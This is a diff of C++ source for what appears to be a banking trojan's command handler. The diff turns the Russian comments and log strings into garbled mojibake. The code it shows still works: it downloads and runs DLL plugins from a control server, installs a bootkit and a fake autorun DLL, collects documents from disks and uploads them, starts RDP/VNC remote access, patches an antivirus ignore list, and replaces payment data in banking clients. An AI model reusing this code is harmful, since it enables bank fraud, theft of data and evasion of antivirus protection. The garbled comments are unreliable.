+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		TBotFileStream File(FileName.t_str(), fcmCreate);
 
 		THTTP HTTP;
@@ -775,7 +786,7 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	// Команда на загрузку библиотеки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WCHAR *FileName = GetTempName();
 
 	if (FileName == NULL)
@@ -796,9 +807,9 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 	char* url = m_strstr( Args, "://" );
 	BYTE* data = 0;
 	DWORD size = 0;
-	if( url == 0 ) //качаем из админки
+	if( url == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		data = Plugin::Download( Args, NULL, &size, false );
-	else //качаем по урлу
+	else //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 		if( !DownloadInMem( Args, &data, &size ) )
 			data = 0;
 	bool res = false;
@@ -844,7 +855,7 @@ static DWORD WINAPI ProcessDocFind(void*)
 				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
 				if( func )
 				{
-					TASKDBG( "Task", "Выполняется команда docfind" );
+					TASKDBG( "Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ docfind" );
 					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
@@ -855,20 +866,20 @@ static DWORD WINAPI ProcessDocFind(void*)
 					char path[MAX_PATH], tmpName[MAX_PATH];
 					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
 					pPathAppendA( path, "search" );
-					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
-					//отправляем если папка не пустая
+					TASKDBG( "Task", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", path );
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					if( !pPathIsDirectoryEmptyA(path) )
 					{
 						File::GetTempName(tmpName);
 						HCAB cab = CreateCab(tmpName);
 						AddDirToCab( cab, path, "docfind" );
 						CloseCab(cab);
-						TASKDBG( "Task", "сформирован cab файл %s", tmpName );
+						TASKDBG( "Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ cab пїЅпїЅпїЅпїЅ %s", tmpName );
 						DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
 						pDeleteFileA(tmpName);
 					}
 					else
-						TASKDBG( "Task", "Папка %s пустая", path );
+						TASKDBG( "Task", "пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅ", path );
 					Directory::Delete(path);
 				}
 			}
@@ -879,10 +890,10 @@ static DWORD WINAPI ProcessDocFind(void*)
 	return 0;
 }
 
-//Загружает плагин (dll) который запускается в отдельном процессе и производит поиск по всем дискам
-//в поисках текстовых документов по заложенной внутри плагина маске, поиск ведется также и в архивах.
-//Запускаем в отдельном процессе, а не в текущем из-за того что плагин может нестабильно работать
-//из-за чего бот может вылететь
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (dll) пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	MegaJump(ProcessDocFind);
@@ -891,7 +902,7 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Запустить множественную загрузку файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return false;
 
   /*		char * cPointer= m_strstr(&Buffer[1],"http:");
@@ -946,21 +957,21 @@ bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// выполнить команду alert
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ alert
 	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
 	return true;
 }
 
 
 //---------------------------------------------------------
-//  InstallBotPlug - Функция загружает  бота в виде длл и
-//                   устанавливает его с помощью инсталятор
+//  InstallBotPlug - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ
+//                   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  InstallerName  - имя инсталятора
+//  InstallerName  - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------
 DWORD WINAPI InstallBotPlug(const string *InstallerName)
 {
-	TASKDBG("BotPlugInstaller", "Начинаем инсталяцию bot.plug инстялятором %s", InstallerName->t_str());
+	TASKDBG("BotPlugInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bot.plug пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", InstallerName->t_str());
 
 	TPlugin Intaller(*InstallerName);
 
@@ -970,12 +981,12 @@ DWORD WINAPI InstallBotPlug(const string *InstallerName)
 	DWORD dllSize;
 	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
 
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Intaller.Download(true)) return FALSE;
 
-	TASKDBG("BotPlugInstaller", "Плагин успешно загружен, начинаем инсталцию");
+	TASKDBG("BotPlugInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Запускаем инсталяцию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	typedef BOOL (WINAPI *TInstall)(BYTE* DllBody, DWORD DllSize);
 
 	BOOL Result = FALSE;
@@ -985,7 +996,7 @@ DWORD WINAPI InstallBotPlug(const string *InstallerName)
 		Result = Install((LPBYTE)dllBody, dllSize) != FALSE;
 
 	if (Result)
-		TASKDBG("BotPlugInstaller", "Инсталяция успешно выполнена");
+		TASKDBG("BotPlugInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	MemFree(dllBody);
 	return Result;
@@ -996,7 +1007,7 @@ DWORD WINAPI InstallBotPlug(const string *InstallerName)
 
 bool ExecuteInstallBootkit(void* Manager, PCHAR Command, PCHAR Args)
 {
-	// Функция инсталирует буткит
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	StartThread(InstallBotPlug, new string(GetStr(EStrBootkitInstaller)));
     return true;
 }
@@ -1004,7 +1015,7 @@ bool ExecuteInstallBootkit(void* Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 {
-	// Функция инсталирует фэкедлл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!BOT::FakeDllInstalled())
 		StartThread(InstallBotPlug, new string(GetStr(EStrFakeDllInstaller)));
 	return true;
@@ -1029,11 +1040,11 @@ static bool IP_Downtime( const char* args, char* ip, int& port, int& downtime )
 	ip[lenIP] = 0;
 	downtime = m_atoi(args + lenAddr);
 	if( downtime == 0 )
-		downtime = 24 * 60; //по умолчанию в режиме простоя сутки
+		downtime = 24 * 60; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	return true;
 }
 
-//команда на подключение к видео серверу, просто шлем лог, его отсылка активизирует подключение к серверу
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
 {
 	#ifdef VideoRecorderH
@@ -1046,7 +1057,7 @@ bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
-//загружает и запускает RDP.DLL
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RDP.DLL
 bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
 {
 	#ifdef VideoRecorderH
@@ -1055,19 +1066,19 @@ bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
 		if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
 		TASKDBG("RDR", "ip: %s, port: %d, downtime %d", ip, port, downtime);
 		HANDLE mutex = TryCreateSingleInstance("RDP");
-		if( mutex ) //длл не запущена, запускаем
+		if( mutex ) //пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			pCloseHandle(mutex);
 			MegaJump(VideoProcess::ProcessRDP);
 		}
 		else
-			TASKDBG( "RDR", "RDP уже запущен" );
+			TASKDBG( "RDR", "RDP пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
 	#endif
 	return true;
 }
 
-//загружает и запускает VNC.EXE
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ VNC.EXE
 bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 {
 /*
@@ -1076,19 +1087,19 @@ bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
 	TASKDBG("VNC", "ip: %s, port: %d, downtime %d", ip, port, downtime);
 	HANDLE mutex = TryCreateSingleInstance("VNC");
-	if( mutex ) //vnc не запущена, запускаем
+	if( mutex ) //vnc пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		pCloseHandle(mutex);
 		MegaJump(VideoProcess::ProcessVNC);
 	}
 	else
-		TASKDBG( "VNC", "VNC уже запущен" );
+		TASKDBG( "VNC", "VNC пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
 */
 	return true;
 }
 
-//создание файла для подмены в IFobs
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ IFobs
 bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
 {
 #ifdef IFobsH
@@ -1101,13 +1112,13 @@ bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
 	return TRUE;
 }
 
-//загрузка указанной папки на видео сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
 {
 	#ifdef VideoRecorderH
 		char name[MAX_PATH];
 		PathToName( Args, name, sizeof(name) );
-		TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
+		TASKDBG( "LF", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ '%s' пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", Args, name );
 		VideoProcess::SendFiles( 0, name, Args, 0, 0, true );
 	#endif
 	return true;
@@ -1130,7 +1141,7 @@ bool ExecuteExec(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 
 //--------------------------------------------------
-//  Функция обновляет плагин бота bot.plug
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ bot.plug
 //--------------------------------------------------
 bool ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
@@ -1151,7 +1162,7 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 		{
 			if( m_lstrncmp( nameFile, "notreboot", 9 ) )
 			{
-				TASKDBG( "AddTrust", "Отключен ребут" );
+				TASKDBG( "AddTrust", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 				reboot = false;
 				nameFile += 10;
 				len -= 10;
@@ -1160,7 +1171,7 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 		}
 		wchar_t* nameIgnore;
 		int lenIgnore;
-		if( len < 5 ) //если не указан файл, то берем имя файла в автозагрузке
+		if( len < 5 ) //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			nameIgnore = AnsiToUnicode( BOT::GetBotFullExeName().t_str(), 0 );
 			lenIgnore = WSTR::CalcLength(nameIgnore);
@@ -1170,22 +1181,22 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 			nameIgnore = AnsiToUnicode( nameFile, len );
 			lenIgnore = len;
 		}
-		TASKDBG( "AddTrust", "Загрузили addtrust.plug" );
-		int szIgnore = sizeof(wchar_t) * (lenIgnore + 1); //размер памяти в которой находится строка
+		TASKDBG( "AddTrust", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ addtrust.plug" );
+		int szIgnore = sizeof(wchar_t) * (lenIgnore + 1); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		wchar_t* metka = L"NOD32 ignore file";
 		int lenMetka = WSTR::CalcLength(metka);
 		void* p = m_memmem( data, size, metka, sizeof(wchar_t) * (lenMetka + 1) );
 		if( p )
 		{
-			TASKDBG( "AddTrust", "Вставили %ls", nameIgnore );
+			TASKDBG( "AddTrust", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %ls", nameIgnore );
 			m_memcpy( p, nameIgnore, szIgnore );
 			char pathFile[MAX_PATH];
 			File::GetTempName(pathFile);
 			if( File::WriteBufferA( pathFile, data, size ) == size )
 			{
-				TASKDBG( "AddTrust", "Сохранили плагин в %s", pathFile );
+				TASKDBG( "AddTrust", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ %s", pathFile );
 				RunFileA( pathFile, true );
-				TASKDBG( "AddTrust", "Плагин выполнился" );
+				TASKDBG( "AddTrust", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 				pSleep(1000);
 				pDeleteFileA(pathFile);
 				if( reboot ) Reboot();
@@ -1209,9 +1220,9 @@ bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
 #ifdef BBSCBankH
 	TASKDBG( "CBank", "%s", Args );
 	int c_args = m_lstrlen(Args);
-	//сохраняем переданный баланс и платежки
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), Args, c_args + 1 );
-	//уставливаем флаг для запуска подмены
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Bot->CreateFileA( 0, GetStr(CBankFlagUpdate).t_str() );
 #endif
 	return true;
@@ -1222,9 +1233,9 @@ bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
 #ifdef TinyH
 	TASKDBG( "Tiny", "%s", Args );
 	int c_args = m_lstrlen(Args);
-	//сохраняем переданный баланс и платежки
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), Args, c_args + 1 );
-	//уставливаем флаг для запуска подмены
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Bot->CreateFileA( 0, GetStr(TinyFlagUpdate).t_str() );
 #endif
 	return true;
@@ -1232,21 +1243,21 @@ bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 /*
 
-// Тело потока команды installfakedll
+// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ installfakedll
 void AsyncInstallFakeDll(void* Arguments)
 {
 	PCHAR ParamList = (PCHAR)Arguments;
 
-	// В параметрах идет обязательные параметрами PlugName, BotPlugName и 
-	// необязательный параметр Target
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PlugName, BotPlugName пїЅ 
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Target
 	string InstallerPlugName = GetCommandParamByIndex(ParamList, 0);
 	string BotPlugName       = GetCommandParamByIndex(ParamList, 1);
 	string Target            = GetCommandParamByIndex(ParamList, 2);
 	
-	// После парсинга сразу освобождаем память списка
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(ParamList);
 
-	// Для сервера нужны только имена в нижнем регистре
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::AnsiLowerCase(InstallerPlugName.t_str());
 
 	TASKDBG("AsyncInstallFakeDll", "Started with InstallerPlugName='%s' BotPlugName='%s' Target='%s'",
@@ -1263,10 +1274,10 @@ void AsyncInstallFakeDll(void* Arguments)
 	do
 	{
 		TASKDBG("AsyncInstallFakeDll", "check is plug loaded from network");
-		// Проверяем загрузился ли плаг
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (InstallerPlug == NULL) break;
 
-		// Проверяем формат (PE)
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (PE)
 		TASKDBG("AsyncInstallFakeDll", "check file from network for PE");
 		if (!IsExecutableFile(InstallerPlug)) break;
 
@@ -1274,7 +1285,7 @@ void AsyncInstallFakeDll(void* Arguments)
 		TASKDBG("AsyncInstallFakeDll", "MemoryLoadLibrary() result=0x%X", Module);
 		if (Module == NULL) break;
 
-		// Installer.plug должен импортировать ф-ции Install(target, body, size).
+		// Installer.plug пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ Install(target, body, size).
 		typedef BOOL (WINAPI *FakeInstallFunction)(
 			const char* BotPlugName, 
 			const char* Target, 
@@ -1282,7 +1293,7 @@ void AsyncInstallFakeDll(void* Arguments)
 			DWORD InstallerBodySize
 			);
 
-		// Получаем и запускаем ф-цию FakeInstall
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ FakeInstall
 		FakeInstallFunction FakeInstall = (FakeInstallFunction)MemoryGetProcAddress(Module, "FakeInstall");
 		TASKDBG("AsyncInstallFakeDll", "MemoryGetProcAddress('FakeInstall') result=0x%X", FakeInstall);
 		
@@ -1294,7 +1305,7 @@ void AsyncInstallFakeDll(void* Arguments)
 		
 		TASKDBG("AsyncInstallFakeDll", "Installation result=%d.", FakeInstallResult);
 
-		// TODO: По идее тут надо сделать какой-то отчет о результате выполнения команды.
+		// TODO: пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	}
 	while (0);
 
@@ -1303,18 +1314,18 @@ void AsyncInstallFakeDll(void* Arguments)
 }
 
 
-// Команда скачивания и запуска инсталера FakeAutorunDll
-// Команда: installfakedll <InstallerName.plug> <BuildedBotPlugName.plug> [<Target>]
-// <InstallerName.plug> - имя инсталятора на сервере
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeAutorunDll
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: installfakedll <InstallerName.plug> <BuildedBotPlugName.plug> [<Target>]
+// <InstallerName.plug> - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
-// <BuildedBotPlugName.plug> - имя плагина бот со встроенными параметрами для подключения к серверу.
+// <BuildedBotPlugName.plug> - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
-// <Target> - необязательный параметр. Указывает конкретные цели установки. Если ничего не указано 
-//            ставится по все возможные цели, который поддерживает инсталятор.
